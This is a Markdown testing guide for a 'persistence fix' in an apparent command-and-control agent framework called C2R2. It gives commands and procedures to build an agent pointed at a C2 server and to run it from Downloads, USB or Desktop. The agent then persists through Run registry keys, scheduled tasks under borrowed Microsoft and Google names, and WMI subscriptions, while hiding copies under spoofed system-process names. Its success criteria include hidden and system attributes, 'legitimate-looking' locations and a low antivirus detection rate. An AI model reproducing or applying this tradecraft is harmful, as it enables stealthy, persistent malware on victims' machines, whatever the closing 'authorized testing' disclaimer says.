# Persistence Fix - Testing Guide

## 🧪 Manual Testing Procedures

### Prerequisites
- Windows 7/8/10/11 VM for testing
- C2R2 server running
- Agent compiled with the fix

### Test Scenario 1: Agent from Downloads Folder

**Objective:** Verify agent persists correctly when executed from Downloads

**Steps:**
1. Build agent:
   ```bash
   cd builder
   cargo run --release -- build-agent --name test-agent --server "192.168.1.10:4444" --production
   ```

2. Transfer `test-agent.exe` to Windows VM Downloads folder

3. On Windows VM:
   - Execute `test-agent.exe` from Downloads
   - Verify connection to C2 server

4. On C2 server:
   ```
   /select 1
   /persist registry
   ```
   
5. Verify success message

6. On Windows VM:
   - Check that file was copied to AppData:
     ```cmd
     dir /a:h "%LOCALAPPDATA%\Microsoft\Windows\Caches"
     dir /a:h "%LOCALAPPDATA%\Microsoft\Windows\WER\ReportQueue"
     dir /a:h "%LOCALAPPDATA%\Microsoft\OneDrive\logs"
     dir /a:h "%LOCALAPPDATA%\Microsoft\Windows\INetCache\Low"
     ```
   
   - Check registry entry points to AppData (not Downloads):
     ```cmd
     reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
     ```

7. **DELETE** `test-agent.exe` from Downloads folder

8. **REBOOT** Windows VM

9. After reboot, verify:
   - ✅ Agent reconnects to C2 server automatically
   - ✅ No error messages about missing executable
   - ✅ Session remains stable

**Expected Result:** Agent persists and reconnects successfully even after original file deleted

---

### Test Scenario 2: Agent from USB Drive

**Objective:** Verify agent persists when executed from removable media

**Steps:**
1. Create virtual USB drive (or use actual USB) mapped to E:\ or F:\

2. Copy `test-agent.exe` to USB drive

3. Execute from USB:
   ```cmd
   E:\test-agent.exe
   ```

4. Establish persistence:
   ```
   /select 1
   /persist task
   ```

5. Verify scheduled task created:
   ```cmd
   schtasks /query /fo LIST /v | findstr "MicrosoftEdge\|GoogleUpdate\|OneDrive"
   ```

6. **DISCONNECT** or **EJECT** USB drive

7. **REBOOT** Windows VM

8. After reboot, verify:
   - ✅ Agent reconnects despite USB disconnected
   - ✅ Task executes from AppData location

**Expected Result:** Agent persists independently of USB drive

---

### Test Scenario 3: Agent Already in AppData

**Objective:** Verify no unnecessary copying when already in persistent location

**Steps:**
1. Manually copy agent to AppData:
   ```cmd
   mkdir "%LOCALAPPDATA%\Microsoft\Windows\Caches"
   copy test-agent.exe "%LOCALAPPDATA%\Microsoft\Windows\Caches\WmiPrvSE.exe"
   ```

2. Execute from that location:
   ```cmd
   "%LOCALAPPDATA%\Microsoft\Windows\Caches\WmiPrvSE.exe"
   ```

3. Establish persistence:
   ```
   /select 1
   /persist registry
   ```

4. Verify NO duplicate copy was created (check file timestamps and count)

5. Reboot and verify functionality

**Expected Result:** No duplicate copy, persistence works directly from existing location

---

### Test Scenario 4: Multiple Persistence Methods

**Objective:** Test all persistence methods work with the fix

**Test 4a - Registry:**
```
/select 1
/persist registry
```
- Check: `reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"`
- Reboot and verify

**Test 4b - Scheduled Task:**
```
/select 1
/persist task
```
- Check: `schtasks /query /fo LIST /v`
- Reboot and verify

**Test 4c - WMI (requires admin):**
```
/select 1
/persist wmi
```
- Check: `Get-WmiObject -Namespace root\subscription -Class __EventFilter`
- Reboot and verify

**Expected Result:** All methods work correctly

---

### Test Scenario 5: Desktop Execution

**Steps:**
1. Copy agent to Desktop
2. Execute from Desktop
3. Establish persistence
4. Delete from Desktop
5. Reboot
6. Verify reconnection

**Expected Result:** Works same as Downloads scenario

---

## 🔍 Verification Checklist

After each test, verify:

- [ ] Agent reconnects after reboot
- [ ] No error messages in Windows Event Viewer
- [ ] Persistence entry points to valid path
- [ ] Session remains stable (doesn't disconnect immediately)
- [ ] Copied file has Hidden + System attributes
- [ ] Copied file in legitimate-looking location

---

## 🐛 Debugging Failed Tests

### Issue: Agent doesn't reconnect after reboot

**Check:**
1. Is the copied file actually there?
   ```cmd
   dir /a:h "%LOCALAPPDATA%\Microsoft\Windows\*" /s | findstr "WmiPrvSE\|conhost\|OneDrive\|MoUsoCoreWorker"
   ```

2. Does the persistence entry point to the right file?
   ```cmd
   reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
   schtasks /query /fo LIST /v
   ```

3. Is Windows Defender blocking execution?
   ```powershell
   Get-MpThreat
   Get-MpThreatDetection
   ```

4. Check Event Viewer:
   - Windows Logs → Application
   - Windows Logs → System
   - Look for errors related to the task/registry entry

### Issue: File copy fails

**Check:**
1. Permissions on AppData folder:
   ```cmd
   icacls "%LOCALAPPDATA%\Microsoft\Windows"
   ```

2. Disk space:
   ```cmd
   dir C:\
   ```

3. AV blocking file creation (check Windows Security → Protection History)

### Issue: Persistence entry created but points to wrong path

**Debug:**
- This indicates a bug in the fix
- Check what path `get_current_exe_path()` is returning
- Add temporary debug logging (in dev mode) to see the actual paths

---

## 📊 Test Results Template

```
Test Date: _______________
Tester: __________________
Windows Version: _________

| Test Scenario | Result | Notes |
|---------------|--------|-------|
| Downloads Folder | ☐ Pass ☐ Fail | |
| USB Drive | ☐ Pass ☐ Fail | |
| Already in AppData | ☐ Pass ☐ Fail | |
| Registry Method | ☐ Pass ☐ Fail | |
| Task Method | ☐ Pass ☐ Fail | |
| WMI Method | ☐ Pass ☐ Fail | |
| Desktop Execution | ☐ Pass ☐ Fail | |

Overall: ☐ All Pass ☐ Some Fail

Notes:
_________________________________________________________________
_________________________________________________________________
_________________________________________________________________
```

---

## 🎯 Success Criteria

The fix is considered successful if:

✅ Agent persists correctly from ANY initial execution location  
✅ No "Windows cannot find executable" errors after reboot  
✅ Sessions remain stable after system restart  
✅ No unnecessary file copies when already in good location  
✅ All persistence methods (registry, task, wmi) work correctly  
✅ AV detection rate remains low (no increase due to fix)

---

**Version:** 2.0.1  
**Last Updated:** November 2024  
**For Educational and Authorized Testing Only**
